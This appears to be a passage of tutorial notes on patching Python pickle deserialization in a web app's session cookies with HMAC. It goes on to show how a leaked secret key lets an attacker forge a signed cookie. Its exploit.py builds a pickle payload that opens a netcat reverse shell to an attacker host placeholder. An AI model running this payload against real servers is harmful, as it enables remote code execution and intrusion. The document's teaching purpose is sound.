In this last capitle we will discuss about the patching of serialization and how can we make it more secure. The problem of HMAC is that it still can be defeated via LFI/XSS etc.

1)The immediate implementation is the use of HMAC as "authenticity" method by using a secretkey we can can ensure that the message won't be accepted if tampered. Define a secretkey under **util/config.py**
```
...
SECRET_KEY = "99308b5cf8de84fe5573a1a775406423"


```

2)Next we need to edit the file **util/auth.py** to use the HMAC upon cookie generation..
```
..
import hmac
import hashlib
...
def sessionToCookie(session):
    # Create a pickled object and then calculate an HMAC using our secret key
    pickled = pickle.dumps(session)
    hmac_calculated = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()

    # Concat the two parts together (base64-encoded) and use it as our cookie
    cookie = base64.b64encode(pickled) + b'.' + base64.b64encode(hmac_calculated)
    return cookie

def cookieToSession(cookie):
    # Split and decode the cookie into Pickle and HMAC
    pickled_b64, hmac_given_b64 = cookie.split(".")
    pickled = base64.b64decode(pickled_b64)
    hmac_given = base64.b64decode(hmac_given_b64)

    # Calculate the expected HMAC value and check if it matches
    hmac_expected = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
    if hmac_expected != hmac_given:
        return None
    
    # We have verified that this server created the cookie, and
    # can now unpickle the object safely
    unpickled = pickle.loads(pickled)
    return unpickled
...
```

3)How to bypass if HMAC used?
Copy **/util/config.py** locally
```
# HTBooks GmbH & Co. KG
# 10.10.2022

DB_NAME = "htbooks.sqlite3"
AUTH_COOKIE_NAME = "auth_8bH3mjF6n9"
SECRET_KEY = "99308b5cf8de84fe5573a1a775406423"

```

4)Create the exploit.py
```
import pickle
import base64
import hashlib
import hmac
import os
import util.config

class RCE:
    def __reduce__(self):
        return os.system, ("nc -nv <ATTACKER_IP> 9999 -e /bin/sh",)

r = RCE()
p = pickle.dumps(r)
h = hmac.new(util.config.SECRET_KEY.encode(), p, hashlib.sha512).digest()
c = base64.b64encode(p) + b'.' + base64.b64encode(h)
print(c.decode())

```

---------------------------------------------------------------------------------------------------------------------------
## De-serialization patching via JSON**
A more secure way is to rely on JSON format on storing data during serialization as it must pass the validation otherwise the de-serialization won't occur.
`json.encode() = secure serialization(evaluate before) of the JSON payload`
`json.decode() = deserialization`
